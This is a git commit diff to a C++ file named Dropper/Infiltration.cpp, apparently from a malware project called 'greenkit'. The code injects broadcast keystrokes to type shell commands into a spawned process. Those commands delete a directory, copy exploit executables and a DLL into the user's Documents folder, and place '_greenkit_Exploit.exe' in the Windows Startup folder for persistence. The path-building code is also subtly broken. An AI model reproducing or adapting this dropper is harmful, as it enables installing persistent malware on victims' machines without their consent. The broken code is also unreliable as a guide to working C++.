83f88bd93f8255339aa57a11f9d7c94895ff4043
LAUDE ELISA <elisalaude@gmail.com>
2015-07-17 23:54:25 +0200

    Try to put a while loop to check if a file already exist before copying it 	modified:   Dropper/Infiltration.cpp

--- Dropper/Infiltration.cpp
+++ Dropper/Infiltration.cpp
@@ -2,7 +2,27 @@
 #include "stdafx.h"
 #include "Infiltration.h"
 #include <windows.h>
+#include <fstream>
 
+int CheckFileExists(TCHAR * file)
+{
+	WIN32_FIND_DATA FindFileData;
+	HANDLE handle = FindFirstFile(file, &FindFileData);
+	int found = handle != INVALID_HANDLE_VALUE;
+	if (found)
+	{
+		FindClose(handle);
+	}
+	return found;
+}
+
+bool is_file_exist(const char *fileName)
+{
+	std::ifstream infile(fileName);
+	bool res = infile.good();
+	infile.close();
+	return res;
+}
 
 void RunExploit()
 {
@@ -38,6 +58,28 @@ void RunExploit()
 	TerminateProcess(pi.hProcess, 0);
 }
 
+void PleaseSendMessage(PCHAR str)
+{
+	for (unsigned int j = 0; j < strlen(str); ++j)
+	{
+		Sleep(10);
+		SendMessage(
+			HWND_BROADCAST,
+			WM_CHAR,
+			str[j],
+			0
+			);
+	}
+	Sleep(1000);
+
+	SendMessage(
+		HWND_BROADCAST,
+		WM_CHAR,
+		VK_RETURN,
+		0
+		);
+}
+
 int ExploitME()
 {
 	STARTUPINFOA si;
@@ -64,36 +106,30 @@ int ExploitME()
 
 	Sleep(1000);
 	
-	PCHAR copy[] = { "rmdir /S /Q %USERPROFILE%\\Documents\\_greenkit_folder",
-		"xcopy _greenkit_Exploit.exe %USERPROFILE%\\Documents\\_greenkit_folder\\",
+	PleaseSendMessage("rmdir /S /Q %USERPROFILE%\\Documents\\_greenkit_folder");
+
+	char* cmd[] = { "xcopy _greenkit_Exploit.exe %USERPROFILE%\\Documents\\_greenkit_folder\\",
 		"xcopy _greenkit_GreenKitExe.exe %USERPROFILE%\\Documents\\_greenkit_folder\\",
 		"xcopy _greenkit_GreenKit.dll %USERPROFILE%\\Documents\\_greenkit_folder\\",
-		"xcopy libcurl-4.dll %USERPROFILE%\\Documents\\_greenkit_folder\\",
 		"xcopy _greenkit_Exploit.exe \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"",
-		"exit",
 		NULL };
+
+	char profilepath[250];
+	ExpandEnvironmentStringsA("%userprofile%", profilepath, 250);
+
+	wchar_t* copy[] = {(wchar_t*)strcat(profilepath, "\\Documents\\_greenkit_folder\\_greenkit_Exploit.exe"),
+			(wchar_t*)strcat(profilepath, "\\Documents\\_greenkit_folder\\_greenkit_GreenKitExe.exe"),
+			(wchar_t*)strcat(profilepath, "\\Documents\\_greenkit_folder\\_greenkit_GreenKit.dll"),
+			(wchar_t*)strcat(profilepath,"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\_greenkit_Exploit.exe"),
+			NULL};
 
 	for (unsigned int i = 0; copy[i] != NULL; ++i)
 	{
-		for (unsigned int j = 0; j < strlen(copy[i]); ++j)
-		{
-			Sleep(10);
-			SendMessage(
-				HWND_BROADCAST,
-				WM_CHAR,
-				copy[i][j],
-				0
-				);
-		}
-		Sleep(1000);
-
-		SendMessage(
-			HWND_BROADCAST,
-			WM_CHAR,
-			VK_RETURN,
-			0
-			);
+		//while (!CheckFileExists(copy[i]))
+			PleaseSendMessage(cmd[i]);
 	}
+
+	PleaseSendMessage("exit");
 
 	CloseHandle(pi.hProcess);
 	CloseHandle(pi.hThread);
@@ -102,3 +138,4 @@ int ExploitME()
 
 	return EXIT_SUCCESS;
 }
+
